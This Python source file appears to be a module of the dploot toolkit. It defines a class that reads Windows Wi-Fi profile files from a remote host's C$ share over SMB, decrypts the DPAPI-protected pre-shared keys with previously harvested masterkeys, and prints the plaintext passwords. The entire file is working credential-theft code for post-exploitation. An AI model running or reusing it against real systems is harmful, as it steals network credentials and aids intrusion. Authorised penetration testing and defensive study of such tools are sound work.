from binascii import unhexlify
import logging
import ntpath
from xml.dom import minidom

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target

class WifiTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']

    system_wifi_generic_path = "ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces"
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_wifi(self):
        logging.info('Triage ALL Wifi profiles')
        try:
            wifi_dir = self.conn.remote_list_dir(self.share, self.system_wifi_generic_path)
            if wifi_dir is not None:
                for dir in wifi_dir:
                    if dir.is_directory() > 0 and dir.get_longname() not in self.false_positive:
                        wifi_interface_path = ntpath.join(self.system_wifi_generic_path,dir.get_longname())
                        wifi_interface_dir = self.conn.remote_list_dir(self.share, wifi_interface_path)
                        for file in wifi_interface_dir:
                            filename = file.get_longname()
                            if file.is_directory() == 0 and filename not in self.false_positive and filename[-4:] == '.xml':
                                wifi_interface_filepath = ntpath.join(wifi_interface_path, filename)
                                logging.info("Found Wifi connection file: \\\\%s\\%s\\%s" %  (self.target.address,self.share,wifi_interface_filepath))
                                wifi_interface_data = self.conn.readFile(self.share, wifi_interface_filepath)
                                self.looted_files[filename] = wifi_interface_data
                                xml_data = minidom.parseString(wifi_interface_data)
                                ssid = xml_data.getElementsByTagName('SSID')[0].getElementsByTagName('name')[0].childNodes[0].data
                                auth_type = xml_data.getElementsByTagName('authentication')[0].childNodes[0].data
                                
                                print('[WIFI]')
                                print('SSID:\t\t%s' % ssid)
                                print('AuthType:\t%s' % auth_type)

                                dpapi_blob = None
                                if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK':
                                    dpapi_blob = xml_data.getElementsByTagName('keyMaterial')[0].childNodes[0].data
                                elif auth_type == 'open':
                                    print()
                                    continue
                                else:
                                    logging.info('Unsupported authentication type: %s. Please open issue to improve the project!' % auth_type)
                                masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob), masterkeys=self.masterkeys)
                                if masterkey is not None:
                                    password = decrypt_blob(unhexlify(dpapi_blob), masterkey=masterkey)
                                    print('Pass:\t\t%s' % password.decode('latin-1'))
                                    print()
        except Exception as e:
            print(str(e))
            pass
        print()

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin